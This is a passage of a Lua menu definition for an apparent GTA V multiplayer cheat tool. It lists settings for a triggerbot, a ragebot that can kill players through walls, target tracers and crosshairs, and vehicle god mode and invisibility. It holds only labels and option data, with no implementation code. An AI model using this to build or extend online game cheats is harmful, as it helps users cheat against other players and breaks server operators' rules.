            {text = 'Bone', dkey = 'combat:triggerbot_bone', desc = 'The bone which will activate the\ntriggerbot.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Triggerbot bone', length = 20, tipus = 'betu', menuextra = 'image_triggerbot_bone', toggle = false, func = {"Head", "Neck", "Spine", "Spine 1", "Spine 2", "Spine 3", "Left Upperarm", "Right Upperarm", "Left Forearm", "Right Forearm", "Left Tight", "Right Tight", "Left foot", "Right foot"}},
            {text = 'On key', dkey = 'combat:triggerbot_onkey', desc = 'If enabled, the triggerbot will only work\nwhen the desired key is pressed.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Triggerbot key', length = 5, tipus = 'vegyes', toggle = false, func = __REAPER1__.T.Keys},
            {text = 'Config', option = __REAPER1__.M.Separator},
            {text = 'Distance', dkey = 'combat:triggerbot_distance', desc = 'The distance within the triggerbot\nshould work.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Triggerbot distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Single shots', dkey = 'combat:triggerbot_singleshots', desc = 'Won\'t imitate a mouse button hold.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Chance', dkey = 'combat:triggerbot_chance', desc = 'The chance precentage that the\ntriggerbot will shoot.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Triggerbot chance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Szazas},
            {text = 'Delay', dkey = 'combat:triggerbot_delay', desc = 'The delay before the triggerbot will\nshoot.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Triggerbot delay', length = 4, tipus = 'vegyes', func = {'Random}},
            {text = 'Max damage', dkey = 'combat:triggerbot_maxdamage', desc = 'The maximum damage that the\ntriggerbot can do.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Triggerbot maximum damage number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Targeting list', dkey = 'combat:triggerbot_targetinglist', desc = 'Ignore or only target the targeting list.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Triggerbot targeting list', length = 5, tipus = 'betu', toggle = false, func = {'Ignore', 'Target'}},
            {text = 'Alive', dkey = 'combat:triggerbot_alive', desc = 'Only shoot at living peds.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only players', dkey = 'combat:triggerbot_onlyplayers', desc = 'Only target players, not peds.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Vehicles', dkey = 'combat:triggerbot_vehicles', desc = 'Shoot at peds who are in vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Target invisible', dkey = 'combat:triggerbot_targetinvisible', desc = 'Target invisible peds too.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['combat:ragebot'] = {
            {text = 'Ragebot', dkey = 'combat:ragebot_ragebot', desc = 'Enable the ragebot.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'On key', dkey = 'combat:ragebot_onkey', desc = 'If enabled, the ragebot will only work\nwhen the desired key is pressed.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Triggerbot key', length = 5, tipus = 'vegyes', toggle = false, func = __REAPER1__.T.Keys},
            {text = 'Config', option = __REAPER1__.M.Separator},
            {text = 'Distance', dkey = 'combat:ragebot_distance', desc = 'The distance within the ragebot\nshould work.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ragebot distance number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Targeting list', dkey = 'combat:ragebot_targetinglist', desc = 'Ignore or only target the targeting list.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ragebot targeting list', length = 5, tipus = 'betu', toggle = false, func = {'Ignore', 'Target'}},
            {text = 'Weapon', dkey = 'combat:ragebot_weapon', desc = 'Weapon that the ragebot should kill\nwith.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ragebot weapon', length = 5, tipus = 'vegyes', func = __REAPER1__.T.WeaponsNoMelee},
            {text = 'Occluded', dkey = 'combat:ragebot_occluded', desc = 'Kill the target when occluded.\n(Through walls)', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only players', dkey = 'combat:ragebot_onlyplayers', desc = 'Only kill players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Vehicles', dkey = 'combat:ragebot_vehicles', desc = 'Only kill peds in vehicles.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['combat:visuals'] = {
            {text = 'Target trace', dkey = 'combat:visuals_targettrace', desc = 'Aimbot/ragebot, it will draw a line\nbetween you and the found target.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Color type', dkey = 'combat:visuals_tcolortype', desc = 'Set the color type for the target tracer.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Target tracer color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'combat:visuals_tcolor', desc = 'Set the color and alpha of the target\ntracer. Format: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Target racer color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Bullet Trace', option = __REAPER1__.M.Separator},
            {text = 'Trace bullets', dkey = 'combat:visuals_tracebullets', desc = 'Enable bullet tracing.', afu = __REAPER1__.M.combat.visuals.tracebullets, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Time', dkey = 'combat:visuals_time', desc = 'The time of the tracer.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Tracer time number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Tizezres},
            {text = 'Flicker', dkey = 'combat:visuals_bflicker', desc = 'Set the tracer to flicker.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Color type', dkey = 'combat:visuals_colortype', desc = 'Set the color type for the tracer.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Tracer color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'combat:visuals_bcolor', desc = 'Set the color and alpha of the tracer.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Tracer color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Impact Trace', option = __REAPER1__.M.Separator},
            {text = 'Trace impacts', dkey = 'combat:visuals_traceimpacts', desc = 'Enable impact impact tracing.', afu = __REAPER1__.M.combat.visuals.traceimpacts, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Type', dkey = 'combat:visuals_type', desc = 'The type of the impact tracer.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Impact tracer type', length = 4, tipus = 'szam', func = {'Cube', 'Sphere'}},
            {text = 'Size', dkey = 'combat:visuals_size', desc = 'The size of the impact tracer.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Impact size number', length = 4, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Time', dkey = 'combat:visuals_itime', desc = 'The time of the impact tracer.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Impact tracer time number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Tizezres},
            {text = 'On entity', dkey = 'combat:visuals_onentity', desc = 'Draw the impact tracer through entities.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Flicker', dkey = 'combat:visuals_iflicker', desc = 'Set the impact tracer to flicker.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Color type', dkey = 'combat:visuals_icolortype', desc = 'Set the color type for the impact tracer.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Impact tracer color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'combat:visuals_icolor', desc = 'Set the color and alpha of the impact\ntracer. Format: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Impact tracer color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Laser sight', option = __REAPER1__.M.Separator},
            {text = 'Laser', dkey = 'combat:visuals_lasersight', desc = 'Enable the laser sight.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Flicker', dkey = 'combat:visuals_flicker', desc = 'Set the laser to flicker.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Color', dkey = 'combat:visuals_color', desc = 'Set the color and alpha of the laser.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Laser color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Rainbow', dkey = 'combat:visuals_rainbow', desc = 'Enable rainbow color for the laser.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['combat:crosshair'] = {
            {text = 'Primary crosshair', dkey = 'combat:crosshair_crosshair', desc = 'Toggle the custom primary crosshair.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Primary crosshair', length = 3, tipus = 'betu', toggle = false, func = {'Always', 'Aim only'}},
            {text = 'Type', dkey = 'combat:crosshair_type', desc = 'Primary crosshair type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Primary crosshair type', length = 20, tipus = 'betu', func = {'Default', 'Default & Dot', 'Dot', 'Scope', 'Scope 2', 'Triangle'}},
            {text = 'Thickness', dkey = 'combat:crosshair_thickness', desc = 'Primary crosshair thickness.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Primary crosshair thickness number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Gap size', dkey = 'combat:crosshair_gapsize', desc = 'Primary crosshair gap size.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Primary crosshair gap size number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Color type', dkey = 'combat:crosshair_colortype', desc = 'Set the color type for the primary\ncrosshair.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Primary crosshair color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'combat:crosshair_color', desc = 'Set the color and alpha of the primary\ncrosshair. Format: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Primary crosshair color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Secondary Crosshair', option = __REAPER1__.M.Separator},
            {text = 'Secondary crosshair', dkey = 'combat:crosshair_scrosshair', desc = 'Toggle the custom secondary crosshair.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary crosshair', length = 3, tipus = 'betu', toggle = false, func = {'Always', 'Aim only'}},
            {text = 'Type', dkey = 'combat:crosshair_stype', desc = 'Secondary crosshair type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary crosshair type', length = 20, tipus = 'betu', func = {'Default', 'Default & Dot', 'Dot', 'Scope', 'Scope 2', 'Triangle'}},
            {text = 'Thickness', dkey = 'combat:crosshair_sthickness', desc = 'Secondary crosshair thickness.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary crosshair thickness number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Gap size', dkey = 'combat:crosshair_sgapsize', desc = 'Secondary crosshair gap size.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary crosshair gap size number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Color type', dkey = 'combat:crosshair_scolortype', desc = 'Set the color type for the secondary\ncrosshair.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Secondary crosshair color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'combat:crosshair_scolor', desc = 'Set the color and alpha of the secondary\ncrosshair. Format: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Secondary crosshair color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Hovered', option = __REAPER1__.M.Separator},
            {text = 'Hover', dkey = 'combat:crosshair_hover', desc = 'Make a crosshair type to be different\nwhen hovered over an entity.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Type', dkey = 'combat:crosshair_htype', desc = 'The crosshair type to change on hover.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Crosshair type', length = 10, tipus = 'betu', func = {'Primary', 'Secondary', 'Both'}},
            {text = 'Entity', dkey = 'combat:crosshair_hentity', desc = 'Choose an entity type to work with the\nhover.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hover entity type', length = 10, tipus = 'betu', func = {'Peds', 'Players', 'Vehicles'}},
            {text = 'Color type', dkey = 'combat:crosshair_hcolortype', desc = 'Set the color type for the hover.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hover color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'combat:crosshair_hcolor', desc = 'Set the color and alpha of the hover.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Hover color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
            {text = 'Targeting list', option = __REAPER1__.M.Separator},
            {text = 'Type', dkey = 'combat:crosshair_ttype', desc = 'The crosshair type to change on\ntargeting list.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Crosshair type', length = 10, tipus = 'betu', toggle = false, func = {'Primary', 'Secondary', 'Both'}},
            {text = 'Color type', dkey = 'combat:crosshair_tcolortype', desc = 'Set the color type for the targeting list.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Targeting list color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'combat:crosshair_tcolor', desc = 'Set the color and alpha of the targeting\nlist. Format: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Targeting list color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
        },

        ['vehicle'] = {
            {text = 'Saved vehicles', dkey = 'vehicle:savedvehicle', desc = 'Saved vehicle menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle', 'vehicle:savedvehicle'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'spawner', dkey = 'vehicle:spawner', desc = 'Vehicle spawner menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle', 'vehicle:spawner'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'customs', dkey = 'vehicle:customs', desc = 'Vehicle customs menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle', 'vehicle:customs'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'fixing', dkey = 'vehicle:fixing', desc = 'Vehicle fixing menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle', 'vehicle:fixing'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'movement', dkey = 'vehicle:movement', desc = 'Vehicle movement menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle', 'vehicle:movement'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'handling', dkey = 'vehicle:handling', desc = 'Vehicle handling menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle', 'vehicle:handling'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'doors', dkey = 'vehicle:doors', desc = 'Vehicle doors menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle', 'vehicle:doors'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'weapons', dkey = 'vehicle:weapons', desc = 'Vehicle weapons menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle', 'vehicle:weapons'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'ramps', dkey = 'vehicle:ramps', desc = 'Vehicle ramps menu.', option = __REAPER1__.M.Menu_Button, func = {'vehicle', 'vehicle:ramps'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'General', option = __REAPER1__.M.Separator},
            {text = 'Last vehicle', dkey = 'vehicle_lastvehicle', desc = 'Apply everything to the previous vehicle\nyou were sitting in.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Clear', dkey = 'vehicle_clear', desc = 'After leaving a vehicle some enabled\nfeatures will be turned off. On enter\nthey will be activated.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Delete', dkey = 'vehicle_deletevehicle', desc = 'Delete the vehicle.', afu = __REAPER1__.M.vehicle.delete, option = __REAPER1__.M.Button},
            {text = 'Toggle engine', dkey = 'vehicle_toggleengine', desc = 'Toggle your vehicle\'s engine.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle toggle', length = 3, tipus = 'betu', toggle = false, func = {'On', 'Off'}},
            {text = 'Fuel', dkey = 'vehicle_fuel', desc = 'Set the fuel level in the vehicle.', afu = __REAPER1__.M.vehicle.fuel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle fuel number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Fuck up vehicle', dkey = 'vehicle_fuckupvehicle', desc = 'Fuck up the vehicle.', afu = __REAPER1__.M.vehicle.fuckupveh, option = __REAPER1__.M.Button},
            {text = 'Remove wheels', dkey = 'vehicle_removewheels', desc = 'Remove the vehicle wheels.', afu = __REAPER1__.M.vehicle.removewheels, option = __REAPER1__.M.Button},
            {text = 'Seat', dkey = 'vehicle_seat', desc = 'Force your ped to sit in a seat.', afu = __REAPER1__.M.vehicle.seat, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle seat', length = 20, tipus = 'vegyes', func = {'Driver', 'Front right', 'Back left', 'Back right', 'Further back left', 'Further back right', 5, 6, 7, 8, 9, 10, 11, 12, 13, 14}},
            {text = 'Dirtiness', dkey = 'vehicle_dirtiness', desc = 'The vehicle dirtiness.', afu = __REAPER1__.M.vehicle.dirtiness, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle dirtiness number', length = 2, tipus = 'szam', func = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}},
            {text = 'Super', option = __REAPER1__.M.Separator},
            {text = 'God mode', dkey = 'vehicle_vehiclegod', desc = 'Toggle the vehicle\'s god mode.', afu = __REAPER1__.M.vehicle.godmode, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Invisible', dkey = 'vehicle_invisiblevehicle', desc = 'Toggle the vehicle\'s visibility.', afu = __REAPER1__.M.vehicle.invisible, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Vehicle alpha', dkey = 'vehicle_vehiclealpha', desc = 'Set the vehicle alpha. Only on your client.', afu = __REAPER1__.M.vehicle.alpha, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle alpha number', length = 3, tipus = 'szam', func = __REAPER1__.T.AlphaValues},
            {text = 'Drive on water', dkey = 'vehicle_driveonwater', desc = 'Drive on water.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'No vehicle gravity', dkey = 'vehicle_novehiclegravity', desc = 'Disable the gravity for the vehicle.', afu = __REAPER1__.M.vehicle.novehiclegravity, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Stick in vehicle', dkey = 'vehicle_stickin', desc = 'Enable so nobody will be able to drag you\nout from vehicles.', afu = __REAPER1__.M.vehicle.stickinveh, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'No fall', dkey = 'vehicle_nofall', desc = 'Enable so you won\'t fall off bikes.', afu = __REAPER1__.M.vehicle.nofall, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'No shot', dkey = 'vehicle_noshot', desc = 'Enable so you peds won\'t shoot you\ninside vehicles.', afu = __REAPER1__.M.vehicle.noshotinveh, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Misc', option = __REAPER1__.M.Separator},
            {text = 'Light multiplier', dkey = 'vehicle_vehiclelightmultiplier', desc = 'Set the vehicle\'s light multiplier.', afu = __REAPER1__.M.vehicle.lightmultiplier, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle light multiplier number', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Engine sound', dkey = 'vehicle_enginesound', desc = 'The vehicle engine sound.', afu = __REAPER1__.M.vehicle.enginesound, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle engine sound', length = 50, tipus = 'betu', func = {'Dinghy', 'Dinghy2', 'Dinghy3', 'Dingh4', 'Jetmax', 'Marquis', 'Seashark', 'Seashark2', 'Seashark3', 'Speeder', 'Speeder2', 'Squalo', 'Submersible', 'Submersible2', 'Suntrap', 'Toro', 'Toro2', 'Tropic', 'Tropic2', 'Tug', 'Benson', 'Biff', 'Cerberus', 'Cerberus2', 'Cerberus3', 'Hauler', 'Hauler2', 'Mule', 'Mule2', 'Mule3', 'Mule4', 'Packer', 'Phantom', 'Phantom2', 'Phantom3', 'Pounder', 'Pounder2', 'Stockade', 'Stockade3', 'Terbyte', 'Asbo', 'Blista', 'Brioso', 'Dilettante', 'Dilettante2', 'Kanjo', 'Issi2', 'Issi3', 'Issi4', 'Iss5', 'Issi6', 'Panto', 'Prarire', 'Rhapsody', 'Cogcabrio', 'Exemplar', 'F620', 'Felon', 'Felon2', 'Jackal', 'Oracle', 'Oracle2', 'Sentinel', 'Sentinel2', 'Windsor', 'Windsor2', 'Zion', 'Zion2', 'Bmx', 'Cruiser', 'Fixter', 'Scorcher', 'Tribike', 'Tribike2', 'Tribike3', 'Ambulance', 'Fbi', 'Fbi2', 'Firetruk', 'Lguard', 'Pbus', 'Police', 'Police2', 'Police3', 'Police4', 'Policeold1', 'Policeold2', 'Policet', 'Policeb', 'Polmav', 'Pranger', 'Predator', 'Riot', 'Riot2', 'Sheriff', 'Sheriff2', 'Akula', 'Annihilator', 'Buzzard', 'Buzzard2', 'Cargobob', 'Cargobob2', 'Cargobob3', 'Cargobob4', 'Frogger', 'Frogger2', 'Havok', 'Hunter', 'Maverick', 'Savage', 'Seasparrow', 'Skylift', 'Supervolito', 'Supervolito2', 'Swift', 'Swift2', 'Valkyrie', 'Valkyrie2', 'Volatus', 'Bulldozer', 'Cutter', 'Dump', 'Flatbed', 'Guardian', 'Handler', 'Mixer', 'Mixer2', 'Rubble', 'Tiptruck', 'Tiptruck2', 'Apc', 'Barracks', 'Barracks2', 'Barracks3', 'Barrage', 'Chernobog', 'Crusader', 'Halftrack', 'Khanjali', 'Minitank', 'Rhino', 'Scarab', 'Scarab2', 'Scarab3', 'Thruster', 'Trailersmall2', 'Akuma', 'Avarus', 'Bagger', 'Bati', 'Bati2', 'BF400', 'Carbonrs', 'Chimera', 'Cliffhanger', 'Daemon', 'Daemon2', 'Defiler', 'Deathbike', 'Deathbike2', 'Deathbike3', 'Diablous', 'Diablous2', 'Double', 'Enduro', 'Esskey', 'Faggio', 'Faggio2', 'Faggio3', 'Fcr', 'Fcr2', 'Gargoyle', 'Hakuchou', 'Hakuchou2', 'Hexer', 'Innovation', 'Lectro', 'Manchez', 'Nemesis', 'Nightblade', 'Oppressor', 'Oppressor2', 'Pcj', 'Rrocket', 'Ratbike', 'Ruffian', 'Sanchez', 'Sanchez2', 'Sanctus', 'Shotaro', 'Sovereign', 'Stryder', 'Thrust', 'Vader', 'Vindicator', 'Vortex', 'Wolfsbane', 'Zombiea', 'Zombieb', 'Blade', 'Buccaneer', 'Buccaneer2', 'Chino', 'Chino2', 'Clique', 'Coquette3', 'Deviant', 'Dominator', 'Dominator2', 'Dominator3', 'Dominator4', 'Dominator5', 'Dominator6', 'Dukes', 'Dukes2', 'Ellie', 'Faction', 'Faction2', 'Faction3', 'Gauntlet', 'Gauntlet2', 'Gauntlet3', 'Gauntlet4', 'Hermes', 'Hotknife', 'Hustler', 'Impaler', 'Impaler2', 'Impaler3', 'Impaler4', 'Imperator', 'Imperator2', 'Imperator3', 'Lurcher', 'Moonbeam', 'Moonbeam2', 'Nightshade', 'Peyote2', 'Phoenix', 'Picador', 'Ratloader', 'RatLoader2', 'Ruiner', 'Ruiner2', 'Ruiner3', 'Sabregt', 'Sabregt2', 'Slamvan', 'Slamvan2', 'Slamvan3', 'Slamvan4', 'Slamvan5', 'Slamvan6', 'Stalion', 'Stalion2', 'Tampa', 'Tampa3', 'Tulip', 'Vamos,', 'Vigero', 'Virgo', 'Virgo2', 'Virgo3', 'Voodoo', 'Voodoo2', 'Yosemite', 'Yosemite2', 'Bfinjection', 'Bifta', 'Blazer', 'Blazer2', 'Blazer3', 'Blazer4', 'Blazer5', 'Bohdi', 'Brawler', 'Bruiser', 'Bruiser2', 'Bruiser3', 'Brutus', 'Brutus2', 'Brutus3', 'Caracara', 'Caracara2', 'Dloader', 'Dubsta3', 'Dune', 'Dune2', 'Dune3', 'Dune4', 'Dune5', 'Everon', 'Freecrawler', 'Hellion', 'Insurgent', 'Insurgent2', 'Insurgent3', 'Kalahari', 'Kamacho', 'Marshall', 'Menacer', 'Outlaw', 'Mesa3', 'Monster', 'Monster3', 'Monster4', 'Monster5', 'Nightshark', 'Rancherxl', 'Rancherxl2', 'Rebel', 'Rebel2', 'Rcbandito', 'Riata', 'Sandking', 'Sandking2', 'Technical', 'Technical2', 'Technical3', 'Trophytruck', 'Trophytruck2', 'Vagrant', 'Zhaba', 'Alphaz1', 'Avenger', 'Avenger2', 'Besra', 'Blimp', 'Blimp2', 'Blimp3', 'Bombushka', 'Cargoplane', 'Cuban800', 'Dodo', 'Duster', 'Howard', 'Hydra', 'Jet', 'Lazer', 'Luxor', 'Luxor2', 'Mammatus', 'Microlight', 'Miljet', 'Mogul', 'Molotok', 'Nimbus', 'Nokota', 'Pyro', 'Rogue', 'Seabreeze', 'Shamal', 'Starling', 'Striekforce', 'Stunt', 'Titan', 'Tula', 'Velum', 'Velum2', 'Vestra', 'Volatol', 'Bjxl', 'Baller', 'Baller2', 'Baller3', 'Baller4', 'Baller5', 'Baller6', 'Cavalcade', 'Cavalcade2', 'Contender', 'Dubsta', 'Dubsta2', 'Fq2', 'Granger', 'Gresley', 'Habanero', 'Huntley', 'Landstalker', 'Mesa', 'Mesa2', 'Novak', 'Patriot', 'Patriot2', 'Radi', 'Rebla', 'Rocoto', 'Seminole', 'Serrano', 'Toros', 'Xls', 'Xls2', 'Asea', 'Asea2', 'Asterope', 'Cog55', 'Cogg552', 'Cognoscenti', 'Cognoscenti2', 'Emperor', 'Emperor2', 'Emperor3', 'Fugitive', 'Glendale', 'Ingot', 'Intruder', 'Limo2', 'Premier', 'Primo', 'Primo2', 'Regina', 'Romero', 'Stafford', 'Stanier', 'Stratum', 'Stretch', 'Superd', 'Surge', 'Tailgater', 'Warrener', 'Washington', 'Airbus', 'Brickade', 'Bus', 'Coach', 'Pbus2', 'Rallytruck', 'Rentalbus', 'Taxi', 'Tourbus', 'Trash', 'Trash2', 'Wastelander', 'Alpha', 'Banshee', 'Bestiagts', 'Blista2', 'Blista3', 'Buffalo', 'Buffalo2', 'Buffalo3', 'Carbonizzare', 'Comet2', 'Comet3', 'Comet4', 'Comet5', 'Coquette', 'Drafter', 'Deveste', 'Elegy', 'Elegy2', 'Feltzer2', 'FlashGT', 'Furoregt', 'Fusilade', 'Futo', 'Gb200', 'Hotring', 'Komoda', 'Imorgon', 'Issi7', 'Italigto', 'Jester', 'Jester2', 'Jester3', 'Jugular', 'Khamelion', 'Kuruma', 'Kuruma2', 'Locust', 'Lynx', 'Massacro', 'Massacro2', 'Neo', 'Neon', 'Ninef', 'Ninef2', 'Omnis', 'Paragon', 'Paragon2', 'Pariah', 'Penumbra', 'Raiden', 'Rapidgt', 'Rapidgt2', 'Raptor', 'Revolter', 'Ruston', 'Schafter2', 'Schafter3', 'Schafter4', 'Schafter5', 'Schafter6', 'Schlagen', 'Schwarzer', 'Sentinel3', 'Seven70', 'Specter', 'Specter2', 'Streiter', 'Sugoi', 'Sultan', 'Sultan2', 'Surano', 'Tampa2', 'Tropos', 'Verlierer2', 'Vstr', 'Zr380', 'Zr3802', 'Zr3803', 'Ardent', 'Btype', 'Btype2', 'Btype3', 'Casco', 'Cheetah2', 'Cheburek', 'Coquette2', 'Deluxo', 'Dynasty', 'Fagaloa', 'Feltzer3', 'Gt500', 'Infernus2', 'Jb700', 'Jb7002', 'Mamba', 'Manana', 'Michelli', 'Monroe', 'Nebula', 'Peyote', 'Pigalle', 'Rapidgt3', 'Retinue', 'Retinue2', 'Savestra', 'Stinger', 'Stingergt', 'Stromberg', 'Swinger', 'Torero', 'Tornado', 'Tornado2', 'Tornado3', 'Tornado4', 'Tornado5', 'Tornado6', 'Turismo2', 'Viseris', 'Z190', 'Ztype', 'Zion3', 'Adder', 'Autarch', 'Banshee2', 'Bullet', 'Cheetah', 'Cyclone', 'Entity2', 'Entityxf', 'Emerus', 'Fmj', 'Gp1', 'Infernus', 'Italigtb', 'Italigtb2', 'Krieger', 'Le7b', 'Nero', 'Nero2', 'Osiris', 'Penetrator', 'Pfister811', 'Prototipo', 'Reaper', 